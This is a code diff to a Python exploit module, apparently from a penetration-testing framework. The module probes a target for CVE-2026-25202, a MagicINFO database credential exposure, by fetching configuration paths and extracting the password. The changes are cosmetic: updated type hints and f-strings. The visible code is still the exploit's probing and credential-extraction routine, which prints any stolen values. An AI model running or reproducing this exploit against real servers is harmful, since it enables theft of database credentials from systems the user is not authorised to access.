@@ -57,7 +57,7 @@ def _contains_config(body: str) -> bool:
     return any(ind in body_lower for ind in _CONFIG_INDICATORS)
 
 
-def _extract_credentials(body: str) -> Optional[str]:
+def _extract_credentials(body: str) -> str | None:
     """Attempt to extract a database password from configuration content.
 
     Args:
@@ -110,9 +110,7 @@ class Exploit(HTTPClient):
     def run(self) -> None:
         """Execute the configuration-exposure probe on all candidate paths."""
         print_status(
-            "Probing {} for CVE-2026-25202 (MagicINFO DB credential exposure)".format(
-                self.target
-            )
+            f"Probing {self.target} for CVE-2026-25202 (MagicINFO DB credential exposure)"
         )
         found_any = False
         for path in _CONFIG_PATHS:
@@ -121,15 +119,15 @@ class Exploit(HTTPClient):
                 found_any = True
                 body_excerpt, cred = result
                 print_success(
-                    "Config content accessible at: {}".format(path)
+                    f"Config content accessible at: {path}"
                 )
                 if cred:
                     print_success(
-                        "Extracted credential value: {}".format(cred)
+                        f"Extracted credential value: {cred}"
                     )
                 else:
                     print_status(
-                        "  Content snippet: {}".format(body_excerpt[:150])
+                        f"  Content snippet: {body_excerpt[:150]}"
                     )
         if not found_any:
             print_error(
@@ -137,7 +135,7 @@ class Exploit(HTTPClient):
                 "WEB-INF is not accessible."
             )
 
-    def _probe_config(self, path: str) -> Optional[tuple]:
+    def _probe_config(self, path: str) -> tuple | None:
         """Fetch a configuration path and analyse it for credential content.
 
         Args:
